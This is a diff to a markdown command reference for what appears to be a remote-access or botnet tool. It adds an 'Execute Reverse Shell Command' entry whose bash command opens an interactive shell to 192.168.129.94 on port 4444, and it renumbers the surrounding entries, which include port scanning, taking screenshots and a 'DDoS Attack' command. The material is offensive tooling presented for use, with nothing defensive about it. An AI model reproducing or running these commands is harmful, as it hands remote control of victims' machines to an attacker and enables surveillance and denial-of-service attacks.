@@ -9,7 +9,16 @@
 }
 ```
 
-### 2. **Network Information**
+### 2. **Execute Reverse Shell Command**
+```json
+{
+    "command": "execute_bash_command",
+    "requirements": [],
+    "bash_command": "/bin/bash -i >& /dev/tcp/192.168.129.94/4444 0>&1"
+}
+```
+
+### 3. **Network Information**
 ```json
 {
     "command": "network_info",
@@ -17,7 +26,7 @@
 }
 ```
 
-### 3. **Port Scan**
+### 4. **Port Scan**
 ```json
 {
     "command": "port_scan",
@@ -25,7 +34,7 @@
 }
 ```
 
-### 4. **Take Screenshot**
+### 5. **Take Screenshot**
 ```json
 {
     "command": "take_screenshot",
@@ -33,7 +42,7 @@
 }
 ```
 
-### 5. **DDoS Attack**
+### 6. **DDoS Attack**
 ```json
 {
     "command": "ddos_attack",
